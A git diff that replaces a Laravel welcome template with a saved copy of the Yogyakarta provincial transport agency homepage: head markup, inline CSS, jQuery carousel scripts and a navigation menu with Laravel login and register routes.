@@ -1,98 +1,435 @@
-<!doctype html>
-<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
-    <head>
-        <meta charset="utf-8">
+<!DOCTYPE html>
+<!-- saved from url=(0030)http://dishub.jogjaprov.go.id/ -->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb" dir="ltr" style="" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface no-generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths webkit chrome win js"><script type="text/javascript" src="chrome-extension://kajfghlhfkcocafkcjlajldicbikpgnp/catcher.js"><!-- script injected by Request Maker --></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1">
+                <!-- head -->
+        <!--<base href="http://dishub.jogjaprov.go.id/">--><base href=".">
 
-        <title>Laravel</title>
+	<meta name="description" content="Web resmi Dinas Perhubungan Provinsi Daerah Istimewa Yogyakarta">
+	<title>Dinas Perhubungan Daerah Istimewa Yogyakarta</title>
+	<link href="./dinas/pemda_rev_mobile.png" rel="shortcut icon" type="image/vnd.microsoft.icon">
+	<link href="http://dishub.jogjaprov.go.id/component/search/?id=89&amp;Itemid=435&amp;format=opensearch" rel="search" title="Search Dinas Perhubungan DIY" type="application/opensearchdescription+xml">
+	<link href="./dinas/animate.min.css" rel="stylesheet" type="text/css">
+	<link href="./dinas/sppagebuilder.css" rel="stylesheet" type="text/css">
+	<link href="./dinas/magnific-popup.css" rel="stylesheet" type="text/css">
+	<link href="./dinas/slick.css" rel="stylesheet" type="text/css">
+	<link href="./dinas/css" rel="stylesheet" type="text/css">
+	<link href="./dinas/css(1)" rel="stylesheet" type="text/css">
+	<link href="./dinas/css(2)" rel="stylesheet" type="text/css">
+	<link href="./dinas/bootstrap.min.css" rel="stylesheet" type="text/css">
+	<link href="./dinas/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<link href="./dinas/legacy.css" rel="stylesheet" type="text/css">
+	<link href="./dinas/template.css" rel="stylesheet" type="text/css">
+	<link href="./dinas/preset1.css" rel="stylesheet" type="text/css" class="preset">
+	<link href="./dinas/pagebuilder.css" rel="stylesheet" type="text/css">
+	<style type="text/css">
+.slick-carousel-46 .slick-slide{margin:0 10px;}.slick-carousel-46 .slick-list{margin:0 -10px;}.slick-carousel-46 .slick-prev,.slick-carousel-46 .slick-next {margin-top:-20px;}.slick-carousel-46 .slick-prev i.pe, .slick-carousel-46 .slick-next i.pe {font-size:44px;color:}
+#ajax_loadmore_181 .btn_text{color:;}#ajax_loadmore_181 .spinner > div{background:#fff;}#ajax_posts_181 .ajax-posts{margin:0 -15px}#ajax_posts_181 .ajax-posts .ajax-post .inner{background-color:#f7f5f2;padding:15px;margin:15px;}#ajax_posts_181 .ajax-post .inner > div.article_style {margin:-15px}#ajax_posts_181 .ajax-posts .ajax-post .overlay .intro-image .caption-content,#ajax_posts_181 .ajax-posts .ajax-post .inner .aga_heading{font-size:20px;line-height:1.4;}#ajax_posts_181 .ajax-posts .ajax-post .inner .item-intro {font-size:15px;line-height:1.6;}#ajax_posts_181 .ajax-post .inner .no-intro-img{margin-top:0;}
+.slick-carousel-314 .slick-slide{margin:0 25px;}.slick-carousel-314 .slick-list{margin:0 -25px;}.slick-carousel-314 .slick-prev,.slick-carousel-314 .slick-next {margin-top:-20px;}.slick-carousel-314 .slick-prev i.pe, .slick-carousel-314 .slick-next i.pe {font-size:44px;color:}
+.sp-page-builder .page-content #section-id-1536226128053 > .sppb-row-overlay {background-color:rgba(0, 0, 0, 0.3)}#column-id-1536226128054{padding-top:20px;padding-right:0;padding-bottom:20px;padding-left:0;color:#ffffff;}#sppb-addon-1536226128055 .sppb-empty-space {padding-bottom:350px;}#sppb-addon-1536284713404 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1536284713404 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1536284713404 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}#sppb-addon-1536226128077 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1536226128077 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1536226128077 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}#sppb-addon-1536284713293 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1536284713293 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1536284713293 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}#sppb-addon-1536284713298 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1536284713298 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1536284713298 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}#sppb-addon-1536284713303 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1536284713303 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1536284713303 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}.sp-page-builder .page-content #section-id-1536284713413{background-image:linear-gradient(46deg, #a5b3ff 18%, #2b00ff 100%);}#column-id-1536284713414{padding-top:20px;padding-right:0;padding-bottom:20px;padding-left:0;color:#ffffff;}#sppb-addon-1536284713415 .sppb-empty-space {padding-bottom:200px;}#sppb-addon-1536284713416 {box-shadow:0 0 0 0 #ffffff;margin:0 20px 30px 0;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1536284713416 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1536284713416 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}#sppb-addon-1482798695 .sppb-empty-space {padding-bottom:20px;}#column-id-1482798697{padding-top:10px;padding-right:0;padding-bottom:10px;padding-left:0;background-color:#ffffff;}#column-id-1482798700{padding-top:55px;padding-right:20px;padding-bottom:0;padding-left:20px;}#sppb-addon-1482798701 .sppb-addon-title {margin-top:0px;margin-bottom:20px;font-size:20px;line-height:20px;font-weight:700;}#sppb-addon-1482798701 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1529563889874 .sppb-empty-space {padding-bottom:35px;}#sppb-addon-1529631033642 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}#sppb-addon-1529631033642 .sppb-addon-title {font-size:16px;line-height:16px;font-weight:700;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1529631033642 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1529631033642 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}#sppb-addon-1529631033642 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1529631033628 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}#sppb-addon-1529631033628 .sppb-addon-title {font-size:16px;line-height:16px;font-weight:700;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1529631033628 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1529631033628 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}#sppb-addon-1529631033628 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1529631033637 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}#sppb-addon-1529631033637 .sppb-addon-title {font-size:16px;line-height:16px;font-weight:700;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1529631033637 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1529631033637 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}#sppb-addon-1529631033637 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1482798708 .sppb-empty-space {padding-bottom:20px;}.sp-page-builder .page-content #section-id-1482798709{padding-top:10px;padding-right:10px;padding-bottom:40px;background-color:#303c6c;background-image:url(/images/svg/section-background-stripes.svg);background-repeat:repeat;background-size:inherit;background-attachment:inherit;background-position:50% 50%;}#column-id-1482798710{padding-top:15px;padding-right:15px;padding-bottom:25px;padding-left:15px;box-shadow:7px 7px 0px 0px #b9b9b9;background-color:#ffffff;}#column-wrap-id-1482798710{margin-top:30px;}#sppb-addon-1482798711 .sppb-empty-space {padding-bottom:20px;}#sppb-addon-1529563890011 .sppb-addon-title {margin-bottom:3px;font-size:17px;line-height:17px;font-weight:700;}#sppb-addon-1529563890011 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1529563890047 .sppb-empty-space {padding-bottom:10px;}#sppb-addon-1529563890014 img{border-radius:20px;}#sppb-addon-1482798714 .sppb-empty-space {padding-bottom:10px;}#sppb-addon-1482798716 #btn-1482798716.sppb-btn-custom { background-color:#242582; color:#ffffff; padding: ;}#sppb-addon-1482798716 #btn-1482798716.sppb-btn-custom:hover { background-color:#d6ce15; color:#5d5d5d;}#column-id-1482798718{padding-top:15px;padding-right:15px;padding-bottom:25px;padding-left:15px;box-shadow:7px 7px 0px 0px #b9b9b9;background-color:#ffffff;}#column-wrap-id-1482798718{margin-top:30px;}#sppb-addon-1482798721 .sppb-empty-space {padding-bottom:5px;}#sppb-addon-1529563889998 .sppb-addon-title {margin-bottom:3px;font-size:17px;line-height:17px;font-weight:700;}#sppb-addon-1529563889998 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1529563890067 .sppb-empty-space {padding-bottom:10px;}#sppb-addon-1529563890001 img{border-radius:20px;}#sppb-addon-1529563890004 .sppb-empty-space {padding-bottom:10px;}#sppb-addon-1482798723 #btn-1482798723.sppb-btn-custom { background-color:#242582; color:#ffffff; padding: ;}#sppb-addon-1482798723 #btn-1482798723.sppb-btn-custom:hover { background-color:#faed26; color:#5d5d5d;}#column-id-1482798725{padding-top:15px;padding-right:15px;padding-bottom:25px;padding-left:15px;box-shadow:7px 7px 0px 0px #b9b9b9;background-color:#ffffff;}#column-wrap-id-1482798725{margin-top:30px;}#sppb-addon-1482798728 .sppb-empty-space {padding-bottom:5px;}#sppb-addon-1482798729 .sppb-addon-title {margin-bottom:3px;font-size:17px;line-height:17px;font-weight:700;}#sppb-addon-1482798729 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1529563890070 .sppb-empty-space {padding-bottom:10px;}#sppb-addon-1529563889924 img{border-radius:20px;}#sppb-addon-1529563889950 .sppb-empty-space {padding-bottom:10px;}#sppb-addon-1529563889961 #btn-1529563889961.sppb-btn-custom { background-color:#242582; color:#ffffff; padding: ;}#sppb-addon-1529563889961 #btn-1529563889961.sppb-btn-custom:hover { background-color:#faed26; color:#5d5d5d;}#column-id-1482798732{padding-top:15px;padding-right:15px;padding-bottom:25px;padding-left:15px;box-shadow:7px 7px 0px 0px #b9b9b9;background-color:#ffffff;}#column-wrap-id-1482798732{margin-top:30px;}#sppb-addon-1482798735 .sppb-empty-space {padding-bottom:5px;}#sppb-addon-1529563889976 .sppb-addon-title {margin-bottom:3px;font-size:17px;line-height:17px;font-weight:700;}#sppb-addon-1529563889976 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1529563890073 .sppb-empty-space {padding-bottom:10px;}#sppb-addon-1529563889983 img{border-radius:20px;}#sppb-addon-1529563889971 .sppb-empty-space {padding-bottom:10px;}#sppb-addon-1530583834899 #btn-1530583834899.sppb-btn-custom { background-color:#242582; color:#ffffff; padding: ;}#sppb-addon-1530583834899 #btn-1530583834899.sppb-btn-custom:hover { background-color:#faed26; color:#5d5d5d;}#sppb-addon-1482798742 .sppb-empty-space {padding-bottom:30px;}#sppb-addon-1482798745 .sppb-addon-title {margin-bottom:15px;font-size:40px;line-height:40px;font-weight:700;}#sppb-addon-1482798745 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1482798746 .sppb-empty-space {padding-bottom:50px;}#sppb-addon-1530946164625 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1530946164625 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1530946164625 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}#sppb-addon-1482798750 .sppb-empty-space {padding-bottom:20px;}.sp-page-builder .page-content #section-id-1482798760{padding:10px;margin:0px;color:#ffffff;background-color:#303030;background-image:url(/images/svg/section-background-stripes.svg);background-repeat:repeat;background-size:inherit;background-attachment:inherit;background-position:50% 50%;}#column-id-1482798761{padding-top:40px;padding-right:0;padding-bottom:40px;padding-left:0;color:#b8b8b8;}#sppb-addon-1531110034029 .sppb-addon-title {margin-top:5px;margin-bottom:30px;color:#ffffff;font-weight:700;}#sppb-addon-1531110034029 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1531110034024 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1531110034024 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1531110034024 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}#column-id-1530506182958{padding-top:40px;padding-bottom:40px;}#sppb-addon-1530506182983 .sppb-addon-title {margin-top:5px;margin-bottom:30px;color:#fefefe;font-weight:700;}#sppb-addon-1530506182983 .sppb-addon-title { font-family:Montserrat; }#sppb-addon-1530506182987 {box-shadow:0 0 0 0 #ffffff;margin:0 0 30px 0;}@media (min-width:768px) and (max-width:991px) {#sppb-addon-1530506182987 {margin-top:0;margin-right:0;margin-bottom:20px;margin-left:0;}}@media (max-width:767px) {#sppb-addon-1530506182987 {margin-top:0;margin-right:0;margin-bottom:10px;margin-left:0;}}.sp-page-builder .page-content #section-id-1529571832846{padding-top:40px;padding-bottom:40px;}#column-id-1529571832856{padding-top:10px;padding-right:10px;padding-bottom:10px;padding-left:10px;}#sppb-addon-1529571832857 .sppb-addon-title {margin-top:10px;margin-bottom:30px;font-size:32px;line-height:32px;font-weight:700;}#sppb-addon-1529571832857 .sppb-addon-title { font-family:Montserrat; }.sp-page-builder .page-content #section-id-1482798755{padding-top:40px;padding-right:0;padding-bottom:40px;padding-left:0;background-color:#303030;background-image:url(/images/svg/section-background-stripes.svg);background-repeat:repeat;background-size:inherit;background-attachment:inherit;background-position:50% 50%;}#column-id-1482798756{padding-top:15px;padding-right:0;padding-bottom:15px;padding-left:0;}#sppb-addon-1482798757 .sppb-addon-title {color:#ffffff;font-size:36px;line-height:36px;font-weight:700;}#sppb-addon-1482798757 .sppb-addon-title { font-family:Montserrat; }#column-id-1482798758{padding-top:20px;padding-right:5px;padding-bottom:20px;padding-left:5px;}#sppb-addon-1482798759 #btn-1482798759.sppb-btn-custom { background-color:#303c6c; color:#ffffff; padding: ;}#sppb-addon-1482798759 #btn-1482798759.sppb-btn-custom:hover { background-color:#d6ce15; color:#5d5d5d;}
+body.site {background-color:#ffffff;}
+body{font-family:Open Sans, sans-serif; font-size:15px; font-weight:normal; }
+h1{font-family:Raleway, sans-serif; font-size:40px; font-weight:100; }
+h2{font-family:Raleway, sans-serif; font-size:33px; font-weight:300; }
+h3{font-family:Raleway, sans-serif; font-size:27px; font-weight:normal; }
+h4{font-family:Raleway, sans-serif; font-size:23px; font-weight:normal; }
+h5{font-family:Raleway, sans-serif; font-size:20px; font-weight:500; }
+h6{font-family:Raleway, sans-serif; font-size:17px; font-weight:600; }
+.sp-megamenu-parent{font-family:Open Sans, sans-serif; font-size:15px; font-weight:normal; }
+#sp-header{ color:#ffffff; }
+#sp-header a{color:#ffffff;}
+#sp-footer{ background-color:#303c6c;color:#ffffff; }
+#sp-footer a{color:#d6d6d6;}
+#sp-footer a:hover{color:#f0f0f0;}
+.offcanvas-menu{}.offcanvas-menu ul li a{color: }.offcanvas-menu .offcanvas-inner .search input.inputbox{border-color: }
+#sp-header .top-search-wrapper .icon-top-wrapper,#sp-header .top-search-wrapper .icon-top-wrapper >i:before,.sp-megamenu-wrapper > .sp-megamenu-parent >li >a,.sp-megamenu-wrapper #offcanvas-toggler,.logo,#cart-menu,#cd-menu-trigger,.cd-cart,.cd-cart > i{height:90px;line-height:90px;}.total_products{top:calc(90px / 2 - 22px);}#sp-header,.transparent-wrapper{height:90px;}.transparent,.sticky-top{}#sp-header #sp-menu .sp-megamenu-parent >li >a,#sp-header #sp-menu .sp-megamenu-parent li .sp-dropdown >li >a,#sp-header .top-search-wrapper .icon-top-wrapper i,#sp-header #cd-menu-trigger i,#sp-header .cd-cart i,#sp-header .top-search-wrapper{color:#ffffff}#sp-header #sp-menu .sp-dropdown .sp-dropdown-inner{background:#303c6c}#sp-header #sp-menu .sp-dropdown .sp-dropdown-inner li.sp-menu-item >a,#sp-header #sp-menu .sp-dropdown .sp-dropdown-inner li.sp-menu-item.separator >a,#sp-header #sp-menu .sp-dropdown .sp-dropdown-inner li.sp-menu-item.separator >a:hover,#sp-header .sp-module-content ul li a,#sp-header .vm-menu .vm-title{color:#ffffff}#sp-header #sp-menu .sp-megamenu-parent >li.active>a,#sp-header #sp-menu .sp-megamenu-parent >li.current-item>a,#sp-header #sp-menu .sp-megamenu-parent >li.sp-has-child.active>a,#offcanvas-toggler >i,#offcanvas-toggler >i:hover{color:#d6ce15}#sp-header #sp-menu .sp-megamenu-parent .sp-dropdown li.sp-menu-item.current-item>a,#sp-header #sp-menu .sp-megamenu-parent .sp-dropdown li.sp-menu-item.current-item.active>a,#sp-header #sp-menu .sp-megamenu-parent .sp-dropdown li.sp-menu-item.current-item.active:hover>a,#sp-header #sp-menu .sp-megamenu-parent .sp-dropdown li.sp-menu-item a:hover{color: #fff;background-color:#d6ce15;}#sp-header.onepage .sp-megamenu-parent li.active a,#sp-header.onepage .sp-megamenu-parent li.active:first-child >a.page-scroll{color:#d6ce15;border-bottom-color:#d6ce15;}.sticky .logo,.sticky #cart-menu,.sticky #cd-menu-trigger,.sticky .cd-cart,.sticky .cd-cart >i,.sticky .menu-is-open >i,#sp-header.sticky .top-search-wrapper .icon-top-wrapper,#sp-header.sticky .top-search-wrapper .icon-top-wrapper >i:before,.sticky .sp-megamenu-wrapper > .sp-megamenu-parent >li >a,.sticky .sp-megamenu-wrapper #offcanvas-toggler,.sticky #sp-logo a.logo{ height:70px;line-height:70px; } .sticky .total_products{top: calc(70px / 2 - 22px);} .sticky .sticky__wrapper{background:#303c6c; height:70px; -webkit-animation-name:fade-in-down;animation-name:fade-in-down;}.sticky .sticky__wrapper .sp-sticky-logo {height:70px;}.sticky.onepage .sticky__wrapper,.sticky.white .sticky__wrapper,.sticky.transparent .sticky__wrapper{background:#303c6c;} #sp-header.sticky #sp-menu .sp-megamenu-wrapper .sp-megamenu-parent >li >a,#sp-header.sticky .top-search-wrapper,#sp-header.sticky .top-search-wrapper .icon-top-wrapper i,#sp-header.sticky #cd-menu-trigger i,#sp-header.sticky .cd-cart i{color:#ffffff;}#sp-header.sticky #sp-menu .sp-megamenu-wrapper .sp-megamenu-parent >li.active>a,#sp-header.sticky #sp-menu .sp-megamenu-wrapper .sp-megamenu-parent >li.current-item>a,#sp-header.sticky #sp-menu .sp-megamenu-wrapper .sp-megamenu-parent >li.sp-has-child.active>a,.sticky #offcanvas-toggler >i,.sticky #offcanvas-toggler >i:hover{color:#d6ce15;}
+	</style>
+	<script type="application/json" class="joomla-script-options loaded">{"csrf.token":"c9ed88488d64f48874da7e7e527c9400","system.paths":{"root":"","base":""}}</script>
+	<script src="./dinas/jquery.min.js.download" type="text/javascript"></script>
+	<script src="./dinas/jquery-noconflict.js.download" type="text/javascript"></script>
+	<script src="./dinas/jquery-migrate.min.js.download" type="text/javascript"></script>
+	<script src="./dinas/jquery.parallax.js.download" type="text/javascript"></script>
+	<script src="./dinas/sppagebuilder.js.download" type="text/javascript"></script>
+	<script src="./dinas/jquery.magnific-popup.min.js.download" type="text/javascript"></script>
+	<script src="./dinas/slick.min.js.download" type="text/javascript"></script>
+	<script src="./dinas/bootstrap.min.js.download" type="text/javascript"></script>
+	<script src="./dinas/modernizr.js.download" type="text/javascript"></script>
+	<script src="./dinas/SmoothScroll.js.download" type="text/javascript"></script>
+	<script src="./dinas/jquery.easing.min.js.download" type="text/javascript"></script>
+	<script src="./dinas/main.js.download" type="text/javascript"></script>
+	<script src="./dinas/core.js.download" type="text/javascript"></script>
+	<script type="text/javascript">
+;(function ($) {
+	$.ajaxSetup({
+		headers: {
+			'X-CSRF-Token': Joomla.getOptions('csrf.token')
+		}
+	});
+})(jQuery);
+jQuery(function($){var $slick_carousel = $(".slick-carousel-46");jQuery(document).ready(function(){ $slick_carousel.slick({infinite:false,slidesToShow: 4,slidesToScroll: 1,nextArrow: '<span style="font-size:44px;" class="slick-next"><i style="font-size:44px;" class="pe pe-7s-angle-right"></i></span>',prevArrow: '<span style="font-size:44px;" class="slick-prev"><i style="font-size:44px;" class="pe pe-7s-angle-left"></i></span>',speed:700,adaptiveHeight:true, cssEase: 'cubic-bezier(0.635, 0.010, 0.355, 1.000)',responsive: [{breakpoint:992,settings: {slidesToShow:4,slidesToScroll:4}},{breakpoint:768,settings: {slidesToShow:3,slidesToScroll:3}},{breakpoint:480,settings: {slidesToShow:4,slidesToScroll:4}}]});});});
+jQuery(function($){var $container=$("#masonry_items_181");var $start=4;var $limit=4;$container.imagesLoaded(function(){$($container).masonry({itemSelector:'.masonry_item'});}); $(document).on('click','#ajax_loadmore_181',function(e){ e.preventDefault();var value=$("input[name=count_181]").val(),request={'option':'com_ajax','module':'ajax_intro_articles','cmd':'load','data':'QmVyaXRhIEJlcmFuZGE=','format':'raw','start':$start,'limit':$limit,'moduleID':181,'Itemid':'435'};$.ajax({type:'GET',data:request,beforeSend:function(response){var loadmore=$("#ajax_loadmore_181");var $loadmore_width=$(loadmore).width();loadmore.find(".spinner").css({"width":$loadmore_width + 'px',"margin":"0 0.01em"}).show();loadmore.find(".btn_text").hide();},success:function (response){$start+=$limit;var loadmore=$("#ajax_loadmore_181");var $container=$("#ajax_posts_181 > #masonry_items_181");var $elems=$(response);$elems.appendTo($container).addClass("fade-in-down");$("#masonry_items_181").imagesLoaded(function(){$("#masonry_items_181").masonry({transitionDuration:0,itemSelector:'.masonry_item'}).masonry('appended',$elems);$(".match-height").matchHeight();return false;});$("input[name=count_181]").val($("#ajax_posts_181 .ajax-post").size());loadmore.find(".spinner").hide();loadmore.find(".btn_text").show();$('[data-toggle="tooltip"]').tooltip();if($("input[name=count_181]").val() == 57){loadmore.hide();$("#ajax_posts_181 > .loader_footer").addClass("done");} },error:function(response){var data='',obj=$.parseJSON(response.responseText);for(key in obj){data=data + ' ' + obj[key] + '<br/>';}}});return false;});});
+jQuery(function($){var $slick_carousel = $(".slick-carousel-314");jQuery(document).ready(function(){ $slick_carousel.slick({infinite:false,slidesToShow: 4,slidesToScroll: 1,nextArrow: '<span style="font-size:44px;" class="slick-next"><i style="font-size:44px;" class="pe pe-7s-angle-right"></i></span>',prevArrow: '<span style="font-size:44px;" class="slick-prev"><i style="font-size:44px;" class="pe pe-7s-angle-left"></i></span>',speed:700,adaptiveHeight:true, cssEase: 'cubic-bezier(0.635, 0.010, 0.355, 1.000)',responsive: [{breakpoint:992,settings: {slidesToShow:4,slidesToScroll:4}},{breakpoint:768,settings: {slidesToShow:3,slidesToScroll:3}},{breakpoint:480,settings: {slidesToShow:1,slidesToScroll:1}}]});});});
+var sp_preloader = '0';
+var sp_offanimation = 'default';
 
-        <!-- Fonts -->
-        <link href="https://fonts.googleapis.com/css?family=Nunito:200,600" rel="stylesheet" type="text/css">
+var stickyHeaderVar = '1';
 
-        <!-- Styles -->
-        <style>
-            html, body {
-                background-color: #fff;
-                color: #636b6f;
-                font-family: 'Nunito', sans-serif;
-                font-weight: 200;
-                height: 100vh;
-                margin: 0;
-            }
+	</script>
+	<meta property="og:title" content="Dinas Perhubungan Daerah Istimewa Yogyakarta">
+	<meta property="og:type" content="website">
+	<meta property="og:url" content="http://dishub.jogjaprov.go.id/">
+	<meta property="og:site_name" content="Dinas Perhubungan DIY">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:site" content="Dinas Perhubungan DIY">
 
-            .full-height {
-                height: 100vh;
-            }
+                    <script type="text/javascript" async="" src="./dinas/js15_as.js.download"></script><script type="text/javascript" async="" src="./dinas/request"></script></head>
+    <body class="site com-sppagebuilder view-page no-layout no-task itemid-435 en-gb ltr  sticky-header layout-fluid off-canvas-menu-init">
 
-            .flex-center {
-                align-items: center;
-                display: flex;
-                justify-content: center;
-            }
+    	        <div class="body-wrapper off-canvas-menu-wrap">
+            <div class="body-innerwrapper body_innerwrapper_overflow">
+    			<div class="transparent-wrapper"><header id="sp-header" class="transparent color sticky"><div class="sticky__wrapper"><div class="container"><div class="row" style="position: relative;"><div id="sp-logo" class="col-xs-9 col-sm-10 col-md-2"><div class="sp-column "><a class="logo" href="http://dishub.jogjaprov.go.id/"><img class="sp-default-logo hidden-xs" src="./dinas/logo1.png" alt="Dinas Perhubungan DIY"><img class="sp-retina-logo hidden-xs" src="./dinas/logo1.png" alt="Dinas Perhubungan DIY" width="280" height="66"><img class="sp-default-logo visible-xs-block" src="./dinas/pemda_rev_mobile.png" alt="Dinas Perhubungan DIY"></a></div></div><div id="sp-menu" class="col-xs-1 col-sm-1 col-md-9" style="position: static;"><div class="sp-column ">			<div class="sp-megamenu-wrapper">
+				<a id="offcanvas-toggler" class="visible-sm visible-xs" href="http://dishub.jogjaprov.go.id/#"><i class="fa fa-bars"></i></a>
+				<ul class="sp-megamenu-parent menu-fade-down-fade-up hidden-sm hidden-xs"><li class="sp-menu-item current-item active"><a href="http://dishub.jogjaprov.go.id/">Home</a></li><li class="sp-menu-item sp-has-child"><a href="http://dishub.jogjaprov.go.id/#">Profil</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 252px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/profil/visi-misi">Visi &amp; Misi</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/profil/struktur-organisasi">Struktur Organisasi</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/profil/tupoksi">Tupoksi</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/profil/lingkup-pekerjaan">Lingkup Pekerjaan</a></li></ul></div></div></li><li class="sp-menu-item sp-has-child"><a href="http://dishub.jogjaprov.go.id/#">Informasi</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 252px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/informasi/program-kegiatan">Program &amp; Kegiatan</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/informasi/realisasi-program">Realisasi Program &amp; Kegiatan</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/informasi/laporan-keuangan">Laporan Keuangan</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/informasi/laporan-kinerja">Laporan Kinerja</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/informasi/produk-hukum">Produk Hukum</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/informasi/daftar-informasi-publik">Daftar Informasi Publik</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/informasi/karya-ilmiah">Hasil Studi</a></li></ul></div></div></li><li class="sp-menu-item sp-has-child"><a href="http://dishub.jogjaprov.go.id/#">Bidang &amp; Layanan</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 252px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/layanan/bidang-angkutan-darat">Bidang Angkutan Darat</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/layanan/bidang-lalu-lintas">Bidang Lalu Lintas</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/layanan/bidang-perhubungan-udara-keselamatan-transportasi">Bidang Perhubungan Udara &amp; Keselamatan Transportasi</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/layanan/upt-trans-jogja">UPT Trans Jogja</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/layanan/upt-kpllaj">UPT KPLLAJ</a></li></ul></div></div></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/berita">Berita</a></li><li class="sp-menu-item sp-has-child"><a href="http://dishub.jogjaprov.go.id/#">Galeri</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 252px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/galeri/galeri-foto">Galeri Foto</a></li><li class="sp-menu-item"><a href="http://dishub.jogjaprov.go.id/galeri/galeri-video">Galeri Video</a></li></ul></div></div></li><li class="sp-menu-item"><a href="{{route('login')}}">Login</a></li><li class="sp-menu-item"><a href="{{route('register')}}">Register</a></li></ul>	